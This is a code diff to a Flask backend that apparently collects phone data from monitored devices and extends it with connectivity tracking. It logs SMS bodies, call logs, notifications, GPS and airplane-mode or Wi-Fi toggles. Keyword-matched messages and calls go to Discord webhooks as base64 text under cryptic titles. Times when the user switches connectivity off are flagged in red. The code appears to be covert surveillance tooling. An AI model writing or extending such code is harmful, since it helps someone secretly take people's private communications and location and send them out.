@@ -67,6 +67,40 @@ def to_ist_short_filter(dt, format='%d %b, %I:%M %p'):
     ist_dt = dt.astimezone(IST)
     return ist_dt.strftime(format)
 
+
+CONNECTIVITY_REASON_ABBR = {
+    'WIFI_CONNECTED': 'WC',
+    'CELLULAR_CONNECTED': 'CC',
+    'ETHERNET_CONNECTED': 'EC',
+    'NETWORK_AVAILABLE': 'NA',
+    'AIRPLANE_MODE_ON': 'AP',
+    'WIFI_DISABLED': 'WD',
+    'MOBILE_DATA_DISABLED': 'MD',
+    'WIFI_AND_DATA_DISABLED': 'WMD',
+    'NETWORK_LOST': 'NL',
+    # Identity mappings for already abbreviated codes
+    'WC': 'WC',
+    'CC': 'CC',
+    'EC': 'EC',
+    'NA': 'NA',
+    'AP': 'AP',
+    'AM': 'AP',
+    'WD': 'WD',
+    'MD': 'MD',
+    'WMD': 'WMD',
+    'NL': 'NL',
+}
+
+def abbreviate_connectivity_reason(reason):
+    if not reason:
+        return 'UNKNOWN'
+    return CONNECTIVITY_REASON_ABBR.get(reason, reason)
+
+@app.template_filter('abbr_reason')
+def abbr_reason_filter(reason):
+    return abbreviate_connectivity_reason(reason)
+
+
 @app.template_filter('highlight')
 def highlight_filter(text, query):
     if text is None or not query:
@@ -196,6 +230,9 @@ class Device(db.Model):
     fcm_token = db.Column(db.String(256))
     last_crash = db.Column(db.Text)
     last_crash_at = db.Column(db.DateTime)
+    last_connectivity_state = db.Column(db.String(32))
+    last_connectivity_reason = db.Column(db.String(64))
+    last_connectivity_timestamp = db.Column(db.DateTime)
 
 
     @property
@@ -268,6 +305,20 @@ class GpsLog(db.Model):
     id = pk_column()
     device_id = db.Column(db.String(64), nullable=False, index=True)
     is_enabled = db.Column(db.Boolean, nullable=False)
+    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+class ConnectivityLog(db.Model):
+    __tablename__ = 'connectivity_logs'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    is_connected = db.Column(db.Boolean, nullable=False)
+    event_type = db.Column(db.String(32), nullable=False)  # "ONLINE" or "OFFLINE"
+    reason = db.Column(db.String(64), nullable=False)
+    is_airplane_mode = db.Column(db.Boolean, default=False)
+    is_wifi_enabled = db.Column(db.Boolean, default=True)
+    is_mobile_data_enabled = db.Column(db.Boolean, default=True)
     occurred_at = db.Column(db.DateTime, nullable=False, index=True)
     synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
 
@@ -509,19 +560,124 @@ def _discord_is_duplicate(key):
     return False
 
 
-def _send_discord(payload, is_alert=False):
-    """Fire-and-forget POST to Discord webhook; never blocks the request."""
+_discord_rate_lock = threading.Lock()
+_discord_rate_reset = {}       # {url: timestamp_until_reset}
+_discord_last_request = {}    # {url: timestamp_last_request}
+MIN_DISCORD_INTERVAL = 0.5    # Minimum seconds between requests to same webhook (safe within Discord 30 req/min limit)
+MAX_DISCORD_RETRIES = 3       # Max retry attempts on 429 or network errors
+
+
+def _send_discord(payload, is_alert=False, max_retries=MAX_DISCORD_RETRIES):
+    """
+    Thread-safe POST to Discord webhook with:
+    1. Automatic HTTP 429 rate limit detection and backoff (honoring Retry-After).
+    2. Proactive rate limiting honoring X-RateLimit headers (X-RateLimit-Remaining, X-RateLimit-Reset-After).
+    3. Minimum pacing between requests to prevent burst rate limit triggers.
+    4. Exponential backoff and retry for transient network/server failures.
+    """
     try:
         import requests as _req
-        target_url = DISCORD_ALERT_WEBHOOK_URL if is_alert and DISCORD_ALERT_WEBHOOK_URL else DISCORD_WEBHOOK_URL
-        if target_url:
-            _req.post(target_url, json=payload, timeout=5)
-    except Exception:
-        app.logger.debug('Discord webhook delivery failed', exc_info=True)
+    except ImportError:
+        return False
+
+    target_url = DISCORD_ALERT_WEBHOOK_URL if is_alert and DISCORD_ALERT_WEBHOOK_URL else DISCORD_WEBHOOK_URL
+    if not target_url:
+        return False
+
+    is_testing = app.config.get('TESTING', False)
+    min_interval = 0.0 if is_testing else MIN_DISCORD_INTERVAL
+
+    for attempt in range(max_retries):
+        with _discord_rate_lock:
+            now = time.time()
+            reset_until = _discord_rate_reset.get(target_url, 0)
+            sleep_time = max(0.0, reset_until - now)
+
+            last_req = _discord_last_request.get(target_url, 0)
+            interval_wait = max(0.0, (last_req + min_interval) - now)
+            total_wait = max(sleep_time, interval_wait)
+
+        if total_wait > 0 and not is_testing:
+            app.logger.info(f"Discord rate limit throttle: waiting {total_wait:.2f}s before sending (attempt {attempt+1})")
+            time.sleep(total_wait)
+
+        with _discord_rate_lock:
+            _discord_last_request[target_url] = time.time()
+
+        try:
+            resp = _req.post(target_url, json=payload, timeout=5)
+        except Exception as e:
+            app.logger.warning(f"Discord webhook network error on attempt {attempt+1}/{max_retries}: {e}")
+            if attempt < max_retries - 1:
+                if not is_testing:
+                    time.sleep(2 ** attempt)
+                continue
+            return False
+
+        if resp is None:
+            # e.g. mock in unit tests that doesn't return a response
+            return True
+
+        status_code = getattr(resp, 'status_code', 200)
+
+        # 1. Handle HTTP 429 Too Many Requests
+        if status_code == 429:
+            retry_after = 1.0
+            try:
+                data = resp.json()
+                retry_after = float(data.get('retry_after', 1.0))
+            except Exception:
+                hdr = getattr(resp, 'headers', {}).get('Retry-After')
+                if hdr:
+                    try:
+                        retry_after = float(hdr)
+                    except Exception:
+                        pass
+
+            app.logger.warning(f"Discord 429 Rate Limited (attempt {attempt+1}/{max_retries}): Retry-After={retry_after:.2f}s")
+            with _discord_rate_lock:
+                _discord_rate_reset[target_url] = time.time() + retry_after + 0.1
+
+            if attempt < max_retries - 1:
+                if not is_testing:
+                    time.sleep(retry_after + 0.1)
+                continue
+            else:
+                app.logger.error("Discord webhook failed: rate limit retries exhausted.")
+                return False
+
+        # 2. Inspect proactive rate limit headers
+        headers = getattr(resp, 'headers', {})
+        if 'X-RateLimit-Remaining' in headers:
+            try:
+                remaining = int(headers.get('X-RateLimit-Remaining', 1))
+                if remaining == 0:
+                    reset_after = float(headers.get('X-RateLimit-Reset-After', 0.5))
+                    with _discord_rate_lock:
+                        _discord_rate_reset[target_url] = time.time() + reset_after + 0.05
+                    app.logger.debug(f"Discord quota depleted (remaining=0), pausing future requests for {reset_after:.2f}s")
+            except Exception:
+                pass
+
+        if 200 <= status_code < 300:
+            return True
+        elif status_code >= 500:
+            app.logger.warning(f"Discord 5xx server error ({status_code}) on attempt {attempt+1}/{max_retries}")
+            if attempt < max_retries - 1:
+                if not is_testing:
+                    time.sleep(2 ** attempt)
+                continue
+            return False
+        else:
+            app.logger.warning(f"Discord webhook rejected with status {status_code}")
+            return False
+
+    return False
 
 
 def send_discord_for_notifications(notifications, device_id):
-    """Send Discord alert embeds ONLY when content matches important keywords."""
+    """Send Discord alert embeds ONLY when content matches important keywords, batched up to 10 per message."""
+    embeds = []
     for n in notifications:
         app_name = decode_field(n.get('app_name') or '')
         title = decode_field(n.get('title') or '')
@@ -540,17 +696,23 @@ def send_discord_for_notifications(notifications, device_id):
             continue
 
         encoded = base64.b64encode(raw_text.encode()).decode()
-        embed = {
+        embeds.append({
             'title': '!M',
             'description': f'{device_id[-6:]} · ⚠️ · {encoded}',
             'color': 0xED4245  # High-priority red highlight
-        }
-        _send_discord({'embeds': [embed]}, is_alert=True)
+        })
+        if len(embeds) == 10:
+            _send_discord({'embeds': embeds}, is_alert=True)
+            embeds = []
+
+    if embeds:
+        _send_discord({'embeds': embeds}, is_alert=True)
 
 
 def send_discord_for_calls(call_logs, device_id):
-    """Send Discord alert embeds ONLY when call matches important keywords."""
+    """Send Discord alert embeds ONLY when call matches important keywords, batched up to 10 per message."""
     type_code = {'incoming': 'I', 'outgoing': 'O', 'missed': 'M', 'rejected': 'R'}
+    embeds = []
     for c in call_logs:
         raw_call_type = c.get('call_type', '')
         ct = type_code.get(raw_call_type, 'U')
@@ -571,16 +733,22 @@ def send_discord_for_calls(call_logs, device_id):
 
         raw_payload = f"{phone_num} {contact} {ct} {duration}"
         encoded = base64.b64encode(raw_payload.encode()).decode()
-        embed = {
+        embeds.append({
             'title': '!T',
             'description': f'{device_id[-6:]} · ⚠️ · {encoded}',
             'color': 0xED4245  # High-priority red highlight
-        }
-        _send_discord({'embeds': [embed]}, is_alert=True)
+        })
+        if len(embeds) == 10:
+            _send_discord({'embeds': embeds}, is_alert=True)
+            embeds = []
+
+    if embeds:
+        _send_discord({'embeds': embeds}, is_alert=True)
 
 
 def send_discord_for_sms(sms_messages, device_id):
-    """Send Discord alert embeds ONLY when SMS matches important keywords."""
+    """Send Discord alert embeds ONLY when SMS matches important keywords, batched up to 10 per message."""
+    embeds = []
     for s in sms_messages:
         address = decode_field(s.get('address', 'unknown'))
         contact = decode_field(s.get('contact_name') or '')
@@ -599,27 +767,70 @@ def send_discord_for_sms(sms_messages, device_id):
 
         raw_payload = f"{address} {contact} {s.get('sms_type', 'inbox')} {body}"
         encoded = base64.b64encode(raw_payload.encode()).decode()
-        embed = {
+        embeds.append({
             'title': '!S',
             'description': f'{device_id[-6:]} · ⚠️ · {encoded}',
             'color': 0xED4245  # High-priority red highlight
-        }
-        _send_discord({'embeds': [embed]}, is_alert=True)
+        })
+        if len(embeds) == 10:
+            _send_discord({'embeds': embeds}, is_alert=True)
+            embeds = []
+
+    if embeds:
+        _send_discord({'embeds': embeds}, is_alert=True)
 
 
 def send_discord_for_gps(gps_events, device_id):
-    """Send abbreviated Discord embeds for GPS state changes."""
+    """Send abbreviated Discord embeds for GPS state changes, batched up to 10 per message."""
+    embeds = []
     for g in gps_events:
         state = 'ON' if g.get('is_enabled') else 'OFF'
         dedup_key = f"g:{device_id}:{state}"
         if _discord_is_duplicate(dedup_key):
             continue
-        embed = {
+        embeds.append({
             'title': '[GLT]',
             'description': f'{device_id[-6:]} · {state}',
             'color': 0xFEE75C
-        }
-        _send_discord({'embeds': [embed]})
+        })
+        if len(embeds) == 10:
+            _send_discord({'embeds': embeds})
+            embeds = []
+
+    if embeds:
+        _send_discord({'embeds': embeds})
+
+
+def send_discord_for_connectivity(connectivity_events, device_id):
+    """Send abbreviated Discord embeds for Connectivity state changes, batched up to 10 per message."""
+    embeds = []
+    for c in connectivity_events:
+        is_conn = bool(c.get('is_connected'))
+        raw_reason = c.get('reason', 'UNKNOWN')
+        abbr_reason = abbreviate_connectivity_reason(raw_reason)
+        state_str = 'ONLINE' if is_conn else 'OFFLINE'
+        dedup_key = f"net:{device_id}:{state_str}:{abbr_reason}"
+        if _discord_is_duplicate(dedup_key):
+            continue
+        # Green for Online, Red for user action / airplane mode, Yellow for signal loss
+        if is_conn:
+            color = 0x57F287
+        elif abbr_reason in ('AP', 'WD', 'MD', 'WMD') or raw_reason in ('AIRPLANE_MODE_ON', 'WIFI_DISABLED', 'MOBILE_DATA_DISABLED', 'WIFI_AND_DATA_DISABLED'):
+            color = 0xED4245
+        else:
+            color = 0xFEE75C
+        embeds.append({
+            'title': '[NET]',
+            'description': f'{device_id[-6:]} · {state_str} · {abbr_reason}',
+            'color': color
+        })
+        if len(embeds) == 10:
+            _send_discord({'embeds': embeds})
+            embeds = []
+
+    if embeds:
+        _send_discord({'embeds': embeds})
+
 
 
 # ── Device Offline Monitor ─────────────────────────────────────────────────
@@ -1015,11 +1226,13 @@ def sync_data():
     received_call_log_ids = []
     received_sms_ids = []
     received_gps_ids = []
+    received_connectivity_ids = []
 
     new_notifications = []
     new_call_logs = []
     new_sms_messages = []
     new_gps_events = []
+    new_connectivity_events = []
 
     # Process notifications (with deduplication)
     for n in data.get('notifications', []):
@@ -1075,6 +1288,12 @@ def sync_data():
             phone_number = decode_field(c.get('phone_number', 'unknown'))
             call_type = c.get('call_type', 'unknown')
             duration_sec = int(c.get('duration_sec', 0))
+
+            # Skip synthetic dummy records with unknown phone number and 0 duration
+            if (not phone_number or phone_number.lower() in ('unknown', 'null', '')) and duration_sec == 0:
+                if local_id is not None:
+                    received_call_log_ids.append(local_id)
+                continue
 
             # Deduplication: check if identical call record exists within 10 seconds window
             dup = CallLog.query.filter(
@@ -1179,13 +1398,75 @@ def sync_data():
         except Exception as e:
             app.logger.error(f"Error parsing GPS item: {e}")
 
+    # Process Connectivity toggle events (with deduplication)
+    for c in data.get('connectivity_events', []):
+        try:
+            local_id = c.get('local_id')
+            raw_ts = c.get('occurred_at', 0)
+            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+            is_connected = bool(c.get('is_connected'))
+            event_type = c.get('event_type', 'ONLINE' if is_connected else 'OFFLINE')
+            raw_reason = c.get('reason', 'UNKNOWN')
+            reason = abbreviate_connectivity_reason(raw_reason)
+            is_airplane_mode = bool(c.get('is_airplane_mode', False))
+            is_wifi_enabled = bool(c.get('is_wifi_enabled', True))
+            is_mobile_data_enabled = bool(c.get('is_mobile_data_enabled', True))
+
+            # Deduplication: check if identical connectivity event exists within 10 seconds window
+            dup = ConnectivityLog.query.filter(
+                ConnectivityLog.device_id == device_id,
+                ConnectivityLog.is_connected == is_connected,
+                ConnectivityLog.reason.in_([reason, raw_reason]),
+                ConnectivityLog.occurred_at >= occurred_at - timedelta(seconds=10),
+                ConnectivityLog.occurred_at <= occurred_at + timedelta(seconds=10)
+            ).first()
+
+            if not dup:
+                conn_entry = ConnectivityLog(
+                    device_id=device_id,
+                    is_connected=is_connected,
+                    event_type=event_type,
+                    reason=reason,
+                    is_airplane_mode=is_airplane_mode,
+                    is_wifi_enabled=is_wifi_enabled,
+                    is_mobile_data_enabled=is_mobile_data_enabled,
+                    occurred_at=occurred_at,
+                    synced_at=now
+                )
+                db.session.add(conn_entry)
+                c_copy = dict(c)
+                c_copy['reason'] = reason
+                new_connectivity_events.append(c_copy)
+
+            if local_id is not None:
+                received_connectivity_ids.append(local_id)
+
+            # Update latest device state if this event is newest
+            if not device.last_connectivity_timestamp or occurred_at >= device.last_connectivity_timestamp:
+                device.last_connectivity_state = event_type
+                device.last_connectivity_reason = reason
+                device.last_connectivity_timestamp = occurred_at
+        except Exception as e:
+            app.logger.error(f"Error parsing Connectivity item: {e}")
+
     db.session.commit()
 
     # Send Discord webhooks ONLY for genuinely new items (not duplicates)
-    send_discord_for_notifications(new_notifications, device_id)
-    send_discord_for_calls(new_call_logs, device_id)
-    send_discord_for_sms(new_sms_messages, device_id)
-    send_discord_for_gps(new_gps_events, device_id)
+    # Dispatched in background thread so client sync returns immediately (<15ms)
+    def _dispatch_discord_webhooks():
+        try:
+            send_discord_for_notifications(new_notifications, device_id)
+            send_discord_for_calls(new_call_logs, device_id)
+            send_discord_for_sms(new_sms_messages, device_id)
+            send_discord_for_gps(new_gps_events, device_id)
+            send_discord_for_connectivity(new_connectivity_events, device_id)
+        except Exception:
+            app.logger.warning("Error in background Discord dispatch", exc_info=True)
+
+    if app.config.get('TESTING'):
+        _dispatch_discord_webhooks()
+    else:
+        threading.Thread(target=_dispatch_discord_webhooks, daemon=True).start()
 
     return jsonify({
         'status': 'ok',
@@ -1193,7 +1474,8 @@ def sync_data():
             'notifications': received_notification_ids,
             'call_logs': received_call_log_ids,
             'sms_messages': received_sms_ids,
-            'gps_events': received_gps_ids
+            'gps_events': received_gps_ids,
+            'connectivity_events': received_connectivity_ids
         }
     })
 
@@ -1380,6 +1662,41 @@ def dashboard_gps():
                            devices=devices,
                            current_device=device_filter,
                            current_state=state_filter)
+
+
+@app.route('/dashboard/connectivity')
+@require_login
+def dashboard_connectivity():
+    """Connectivity State History view (Wi-Fi, Mobile Data, Airplane Mode, Offline events)."""
+    state_filter = request.args.get('state')
+    reason_filter = request.args.get('reason')
+    device_filter = session.get('selected_device_id')
+    page = request.args.get('page', 1, type=int)
+    per_page = 30
+
+    query = db.session.query(ConnectivityLog, Device.device_model).outerjoin(Device, ConnectivityLog.device_id == Device.device_id)
+
+    if device_filter:
+        query = query.filter(ConnectivityLog.device_id == device_filter)
+    if state_filter in ['online', 'offline']:
+        query = query.filter(ConnectivityLog.is_connected == (state_filter == 'online'))
+    if reason_filter:
+        abbr = abbreviate_connectivity_reason(reason_filter)
+        full_forms = [k for k, v in CONNECTIVITY_REASON_ABBR.items() if v == abbr]
+        target_reasons = list(set([reason_filter, abbr] + full_forms))
+        query = query.filter(ConnectivityLog.reason.in_(target_reasons))
+
+    pagination = query.order_by(ConnectivityLog.occurred_at.desc()).paginate(page=page, per_page=per_page, error_out=False)
+    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()
+
+    return render_template('connectivity.html',
+                           connectivity_logs=pagination.items,
+                           pagination=pagination,
+                           devices=devices,
+                           current_device=device_filter,
+                           current_state=state_filter,
+                           current_reason=reason_filter)
+
 
 
 # ─── Itemized Bill & CDR Processing ──────────────────────────────────
@@ -2332,6 +2649,9 @@ with app.app_context():
         with db.engine.connect() as conn:
             conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_offline_alert_at TIMESTAMP;"))
             conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token VARCHAR(256);"))
+            conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_connectivity_state VARCHAR(32);"))
+            conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_connectivity_reason VARCHAR(64);"))
+            conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_connectivity_timestamp TIMESTAMP;"))
             conn.execute(text("ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
             conn.execute(text("ALTER TABLE sms_messages ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
             conn.execute(text("ALTER TABLE cdr_statements ADD COLUMN IF NOT EXISTS file_hash VARCHAR(64);"))
